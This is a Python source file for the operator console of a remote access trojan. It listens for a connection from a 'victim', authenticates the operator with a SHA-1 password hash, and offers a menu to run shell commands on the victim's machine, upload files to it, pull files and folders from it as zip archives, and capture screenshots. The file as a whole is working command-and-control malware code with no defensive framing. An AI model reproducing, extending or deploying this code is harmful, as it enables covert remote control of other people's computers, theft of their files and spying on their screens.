#import libraries
import subprocess
import os
import json
import hashlib
from glob import glob
from Server import *
import getpass

# define globals
DSIZE = 102400
DELIMETER = "<END_OF_RESULTS>"

# list available actions
def show_options():
    print("[1] Run Command On Victiom OS")
    print("[2] Upload File To Victim Machine")
    print("[3] Download File From Victim Machine")
    print("[4] Capture Screenshot")
    print("[5] Exit", end = "\n\n")

    
# handle user choice and call appropriate functions to perform the respective tasks
def serverhandler(my_socket):
     print("[+] Handling Server Side Connections")
     print("")
     while True :
        show_options()
        ch = input("[+] Select Your Options :")
        my_socket.send_data(ch)
        if ch == "1" or ch == "01":
            print("[+] Running Commands On Victim")
            send_commands(my_socket)   # Send System Commands
         
        elif ch == "2" or ch == "02":
            print ("[+] Uploading Files To Victim")
            # upload files to the victim machine
            upload_file(my_socket)

        elif ch == "3" or ch == "03":
            # Download files from victim
            receive_file_folder(my_socket)

        elif ch =="4" or ch == "04":
            capture_screenshot(my_socket)

        elif ch == "exit" or ch == "quit" or ch =="5":
            break

        else :
            print ("[+] Wrong Option")
            print("")
            show_options()
            continue

# get output of commands executed on Victim/Client
def send_commands(my_socket):
     print("[+] Running Commands", end = "\n\n")
     while True:
         cmd = input(">> ")
         my_socket.send_data(cmd)
         if cmd == "exit" or cmd == "quit" or cmd == "stop":
             print("")
             show_options()
             break
         if cmd == "":
             continue
         result = my_socket.receive_result()
         print(result)   

# receive files or folders from victim
def receive_file_folder(my_socket):
    print("[+] Receiving File/Folders")
    full_list=b''
    while True:
            chunk = my_socket.client_conn.recv(DSIZE)
            if chunk==(DELIMETER.encode('utf-8')):
                break
            full_list=full_list+chunk
    
    print("")
    file_dict=json.loads(full_list)
    for index in file_dict :
            print(f"[{index}] {file_dict[index]} ")                 
    
    print("")
    file_index = input("[+] Select File/Folder :")
    target = file_dict[file_index]
    my_socket.send_data(target)
    zipped_file = target+".zip"
    my_socket.receive_zipped(zipped_file)


def capture_screenshot(my_socket):
    print("[+] Capturing Screenshot")
    zipped_name = "screenshot.zip"
    my_socket.receive_zipped(zipped_name)


def check_password(my_socket):
     # defining local variables
     i = 0
     counter = 0
     print("[+] Authenticate Yourself")
     # Run 3 Password Tries
     while i<3:
         opt = 3-i
         print(f"[+] {opt} Chance Remaining")
        #  password = input("[+] Enter Password : ")
         password = getpass.getpass("[+] Enter Password : ")
         passbytes = password.encode('utf-8')
         # Encrypting Password Using SHA-1 
         hashval = hashlib.sha1(passbytes).hexdigest()
         checksum = str(hashval)
         # Sending the Encrypted Password to the Client for authentication
         my_socket.send_data(checksum)
         counter = my_socket.recv_data()
         if counter == "[+] Okay":
             print("[+] Setting Up Framework")
             counter = 1
             break
         else :
             print("[+] Wrong One Kiddo")
         i=i+1
     return counter

# upload files to victim
def upload_file(my_socket):
     print ("[+] File List")
     # List all files in the current directory
     files = glob("*")
     for index, filename in enumerate(files):
         new_file=os.path.basename(filename)
         print(f"\t[{index}]\t{new_file}")

     while True:
         try:
             file_index=int(input("[+] Select File Index : "))
             if len(files) >= file_index >=0 :
                 filetosend = files[file_index]     
                 break
         except :
             print("[-] Invalid Input")
            
     print("[+] File Selected = ", filetosend)
     # Sending Over Filename to Client
     my_socket.send_data(filetosend)
     # Sending Over The File to Client
     my_socket.send_file(filetosend)



if __name__=='__main__':
    # Create Socket Object
    my_socket = ServerConnection()
    port = 8080 # Change This

    my_socket.CreateConnection(port)
    print(f"[+] Creating Socket And Binding It To Port {port}")

    my_socket.Listen(3)# Max Number Of Connections To Listen To Set to 3
    print("[+] Socket Is Listening For Connections")

    # Receive Connection From Client aka Victim
    my_conn , addr= my_socket.AcceptConnection()
    print(f"[+] Connected To {addr[0]} On Port {addr[1]}")

    # Check Password 
    my_socket.send_data("[+] Success")
    flagval = check_password(my_socket)

    if flagval == 1:
        print(my_socket.recv_data())
        serverhandler(my_socket)
        print("[+] Exiting Server")
        my_socket.end_conn()

    else:
        print ("[+] Closing Connection")
        my_socket.end_conn()
